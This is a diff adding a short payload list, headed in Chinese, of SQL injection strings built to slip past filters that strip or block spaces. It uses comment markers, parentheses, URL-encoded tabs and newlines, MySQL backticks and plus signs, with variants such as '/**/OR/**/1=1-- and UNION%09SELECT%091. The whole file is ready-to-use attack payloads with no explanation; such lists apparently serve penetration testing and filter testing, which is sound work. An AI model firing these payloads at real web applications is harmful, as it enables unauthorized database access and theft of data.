@@ -1,0 +1,36 @@
+# 无空格注入 - 各种替代方案
+# 注释替代
+'/**/OR/**/1=1--
+UNION/**/SELECT/**/1
+SELECT/**/1/**/FROM/**/dual
+
+# 括号替代
+'OR(1=1)--
+UNION(SELECT(1))
+(SELECT(1))FROM(dual)
+'AND(1)=(1)--
+'OR(1)LIKE(1)--
+
+# Tab 替代
+'%09OR%091=1--
+UNION%09SELECT%091
+
+# 换行替代
+'%0aOR%0a1=1--
+UNION%0aSELECT%0a1
+'%0dOR%0d1=1--
+
+# 反引号 (MySQL)
+'OR`1`=`1`--
+UNION`SELECT`1
+
+# 加号 (URL编码空格)
+'+OR+1=1--
+UNION+SELECT+1
+
+# %20 替代
+'%20OR%201=1--
+
+# 混合
+'%09/**/OR%0a1=1--
+UNION%09/**/SELECT%0a1
